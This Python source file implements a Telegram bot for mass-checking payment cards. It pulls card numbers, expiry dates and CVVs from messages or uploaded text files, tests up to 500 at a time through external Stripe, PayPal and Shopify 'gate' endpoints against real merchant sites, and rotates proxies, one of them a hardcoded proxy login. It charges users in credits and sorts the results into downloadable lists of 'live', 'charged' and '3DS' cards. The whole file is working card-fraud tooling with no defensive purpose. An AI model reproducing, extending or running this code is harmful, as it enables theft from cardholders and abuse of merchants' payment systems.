import aiohttp
import asyncio
import time
import re
import os
from io import BytesIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes, CallbackQueryHandler
from config import API_TIMEOUT, get_bin_info

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MAX_CARDS = 500
SEMAPHORE_LIMIT = 10

GATE_CONFIG = {
    "au":   {"name": "Sᴛʀɪᴘᴇ Aᴜᴛʜ", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False},
    "mss":  {"name": "Sᴛʀɪᴘᴇ Mᴀss", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False},
    "mpp2": {"name": "PᴀʏPᴀʟ Mᴀss", "url": "https://paypal0-1.onrender.com/pp1/cc={card}", "site": "", "use_proxy": False},
    "msh":  {"name": "Sʜᴏᴘɪғʏ", "url": "https://autosh.up.railway.app/shopii", "site": "https://powerbuild.store", "use_proxy": True},
    "mchk": {"name": "Sᴛʀɪᴘᴇ", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False},
    "mpp":  {"name": "PᴀʏPᴀʟ", "url": "https://paypal0-1.onrender.com/pp1/cc={card}", "site": "", "use_proxy": False},
}

def load_list_from_file(filename: str, default_list: list) -> list:
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            items = [line.strip() for line in f if line.strip()]
            if items: return items
    return default_list

PROXIES = load_list_from_file("proxies.txt", ["http://purevpn0s12153504:1LTpwxbCJbEdXo@px041202.pointtoserver.com:10780"])
SITES = load_list_from_file("sites.txt", ["https://powerbuild.store"])

def parse_cards(text: str) -> list:
    cards = []
    pattern = r'\b(\d{13,19})\s*[^a-zA-Z0-9\n]?\s*(\d{1,2})\s*[^a-zA-Z0-9\n]?\s*(\d{2,4})\s*[^a-zA-Z0-9\n]?\s*(\d{3,4})\b|\b(\d{13,19})\b'
    matches = re.findall(pattern, text)
    for match in matches:
        if match[0]: cards.append(f"{match[0]}|{match[1]}|{match[2]}|{match[3]}")
        elif match[4]: cards.append(match[4])
    return cards

async def _download_file_cards(bot, file_id: str) -> str | None:
    try:
        file = await bot.get_file(file_id)
        content = await file.download_as_bytearray()
        if content:
            try: return content.decode("utf-8", errors="ignore")
            except: return content.decode("latin-1", errors="ignore")
        return None
    except Exception as e:
        print(f"Download error: {e}")
        return None

async def extract_cards_from_update(update: Update, bot) -> list | None:
    msg = update.message
    
    # 1. Direct text after command
    if update.args:
        cards = parse_cards(" ".join(update.args))
        if cards: return cards
    
    # 2. Reply to message (text or file)
    if msg.reply_to_message:
        replied = msg.reply_to_message
        if replied.text and replied.text.strip():
            cards = parse_cards(replied.text)
            if cards: return cards
        if replied.document and replied.document.file_id:
            content = await _download_file_cards(bot, replied.document.file_id)
            if content:
                cards = parse_cards(content)
                if cards: return cards

    # 3. Direct file sent (user sent file with command as caption)
    if msg.document and msg.document.file_id:
        content = await _download_file_cards(bot, msg.document.file_id)
        if content:
            cards = parse_cards(content)
            if cards: return cards

    # 4. Message text (if command was in message without args)
    if msg.text and msg.text.strip() and not msg.text.startswith('/'):
        cards = parse_cards(msg.text)
        if cards: return cards

    return None

class ProxyRotator:
    def __init__(self, proxies: list):
        self.proxies = proxies
        self._index = 0
    def next(self) -> str | None:
        if not self.proxies: return None
        proxy = self.proxies[self._index % len(self.proxies)]
        self._index += 1
        return proxy
    def count(self) -> int: return len(self.proxies)

async def deduct_credits(context: ContextTypes.DEFAULT_TYPE, user_id: int, amount: int) -> bool:
    uid = str(user_id)
    if "user_data" not in context.bot_data: context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {"plan": "TRIAL", "credits": 0, "expires": 0}
    ud = context.bot_data["user_data"][uid]
    is_premium = ud.get("plan", "TRIAL").upper() != "TRIAL" and ud.get("expires", 0) > time.time()
    if is_premium: return True
    available = ud.get("credits", 0)
    if available < amount: return False
    ud["credits"] = available - amount
    return True

def create_result_buttons() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ LIVE", callback_data="result_live"), InlineKeyboardButton("🔐 3DS", callback_data="result_3ds")],
        [InlineKeyboardButton("💎 CHARGE", callback_data="result_charge"), InlineKeyboardButton("📦 ALL", callback_data="result_all")]
    ])

async def check_single_card(session, gate_key, api_url, site, card, proxy, semaphore):
    async with semaphore:
        try:
            if "{card}" in api_url:
                url = api_url.replace("{card}", card)
                async with session.get(url) as resp:
                    data = await resp.json(content_type=None)
            else:
                params = {"cc": card, "site": site}
                if proxy: params["proxy"] = proxy
                async with session.get(api_url, params=params) as resp:
                    data = await resp.json(content_type=None)
            
            if not isinstance(data, dict): data = {"Response": str(data), "Status": "false"}
            
            response_text = str(data.get("Response") or data.get("response") or data.get("message") or "ERROR").strip()
            status = str(data.get("Status") or data.get("status") or "false").lower()
            
            if status == "true" or "approved" in response_text.lower(): card_status = "approved"
            elif "3ds" in response_text.lower() or "3d secure" in response_text.lower(): card_status = "3ds"
            elif "charged" in response_text.lower() or "captured" in response_text.lower(): card_status = "charged"
            else: card_status = "dead"
            
            return {"card": card, "response": response_text, "status": status, "card_status": card_status, "error": None}
        except Exception as e:
            return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false", "card_status": "dead"}

async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_key: str):
    cfg = GATE_CONFIG[gate_key]
    gate_name = cfg["name"]
    api_url = cfg["url"]
    site = cfg["site"]
    use_proxy = cfg["use_proxy"]
    
    if not context.bot_data.get(f"{gate_key}_on", True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML"); return
        
    cards = await extract_cards_from_update(update, context.bot)
    if not cards:
        await update.message.reply_text(
            f"⚠️ Uꜱᴀɢᴇ:\n• <code>/{gate_key} cc|mm|yy|cvv</code>\n• Reply to a .txt file with /{gate_key}\n• Send a .txt file with /{gate_key} as caption", 
            parse_mode="HTML"
        ); return
        
    if len(cards) > MAX_CARDS:
        await update.message.reply_text(f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴇʀ ʀᴜɴ. Yᴏᴜ ꜱᴇɴᴛ: {len(cards)}", parse_mode="HTML"); return

    if not await deduct_credits(context, update.effective_user.id, len(cards)):
        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
        await update.message.reply_text(f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", parse_mode="HTML"); return

    rotator = ProxyRotator(PROXIES)
    dynamic_sites = SITES if SITES else ["https://powerbuild.store"]
    
    proxy_info = ""
    if use_proxy:
        proxy_info = f"\nPʀᴏxɪᴇꜱ ➺ {rotator.count()}" + (" (Nᴏɴᴇ)" if not PROXIES else "")
        proxy_info += f"\n🌐 Sɪᴛᴇꜱ ➺ {len(dynamic_sites)}"
    else:
        dynamic_sites = [site]

    msg = await update.message.reply_text(
        f"[₪] Gᴀᴛᴇ ➺ {gate_name} | 0-5 Usd \n━━━━━━━━━━━━━━\n      [◈] Sᴛᴀᴛᴜs ➺ Sᴛᴀʀᴛɪɴɢ...\n━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}{proxy_info}\n━━━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...", 
        parse_mode="HTML"
    )

    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
    start_time = time.time()

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=180), connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)) as session:
        tasks = []
        for i, c in enumerate(cards):
            proxy = rotator.next() if use_proxy else None
            site_to_use = dynamic_sites[i % len(dynamic_sites)] if use_proxy else site
            tasks.append(check_single_card(session, gate_key, api_url, site_to_use, c, proxy, semaphore))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)

    parsed = [r if not isinstance(r, Exception) else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false", "card_status": "dead"} for r in results]
    approved_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "approved"]
    charged_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "charged"]
    threeds_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "3ds"]
    dead_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "dead"]
    error_list = [r for r in parsed if r.get("error")]

    context.bot_data[f"{gate_key}_results_{update.effective_user.id}"] = {
        "parsed": parsed, "approved": approved_list, "charged": charged_list, 
        "threeds": threeds_list, "dead": dead_list, "error": error_list, 
        "gate": gate_name, "total": len(parsed)
    }

    lines = [
        f"[₪] Gᴀᴛᴇ ➺ {gate_name} | 0-5 Usd ",
        "━━━━━━━━━━━━━━",
        f"      [◈] Sᴛᴀᴛᴜs ➺ Fɪɴɪsʜᴇᴅ ✅",
        f"      [𖣸] Cʜᴇᴄᴋᴇᴅ ➺ {len(parsed)}/{len(cards)}",
        "━━━━━━━━━━━━━━",
        f"♘ Aᴘᴘʀᴏᴠᴇᴅ ➺ {len(approved_list)} ✅",
        f"♞ Cʜᴀʀɢᴇᴅ ➺ {len(charged_list)} 💎",
        f"3ᴅs ➺ {len(threeds_list)} 🔐",
        f"Dᴇᴀᴅ ➺ {len(dead_list)} ❌",
        f"Eʀʀᴏʀs ➺ {len(error_list)} ⚠️",
        f"Tɪᴍᴇ ➺ {time.time() - start_time:.1f}s",
    ]
    await msg.edit_text("\n".join(lines), parse_mode="HTML", reply_markup=create_result_buttons())

async def cmd_au(u, c): await process_mass(u, c, "au")
async def cmd_mss(u, c): await process_mass(u, c, "mss")
async def cmd_mpp2(u, c): await process_mass(u, c, "mpp2")
async def cmd_msh(u, c): await process_mass(u, c, "msh")
async def cmd_mchk(u, c): await process_mass(u, c, "mchk")
async def cmd_mpp(u, c): await process_mass(u, c, "mpp")

async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    data_key = None
    for prefix in GATE_CONFIG.keys():
        key = f"{prefix}_results_{user_id}"
        if key in context.bot_data:
            data_key = key; break
            
    if not data_key:
        await query.answer("Results expired. Please run the command again.", show_alert=True); return
        
    results = context.bot_data[data_key]
    data = query.data
    file_content = ""
    file_name = ""
    
    if data == "result_live":
        file_name = f"live_cards_{user_id}.txt"
        file_content = "\n".join([r["card"] for r in results.get("approved", [])])
        if not file_content: file_content = "No approved (live) cards found."
    elif data == "result_3ds":
        file_name = f"3ds_cards_{user_id}.txt"
        file_content = "\n".join([r["card"] for r in results.get("threeds", [])])
        if not file_content: file_content = "No 3DS cards found."
    elif data == "result_charge":
        file_name = f"charged_cards_{user_id}.txt"
        file_content = "\n".join([r["card"] for r in results.get("charged", [])])
        if not file_content: file_content = "No charged cards found."
    elif data == "result_all":
        file_name = f"all_results_{user_id}.txt"
        lines = []
        for r in results.get("parsed", []):
            card = r.get("card", "N/A")
            status = r.get("card_status", "N/A").upper()
            resp = r.get("response", "N/A")
            lines.append(f"{card} - {status} - {resp}")
        file_content = "\n".join(lines)
        if not file_content: file_content = "No cards processed."
        
    bio = BytesIO(file_content.encode('utf-8'))
    bio.name = file_name
    await context.bot.send_document(chat_id=query.message.chat_id, document=bio, filename=file_name)

def get_mass_handlers():
    return [
        CommandHandler("au", cmd_au),
        CommandHandler("mss", cmd_mss),
        CommandHandler("mpp2", cmd_mpp2),
        CommandHandler("msh", cmd_msh),
        CommandHandler("mchk", cmd_mchk),
        CommandHandler("mpp", cmd_mpp),
        CallbackQueryHandler(mass_callback_handler, pattern=r'^result_')
    ]
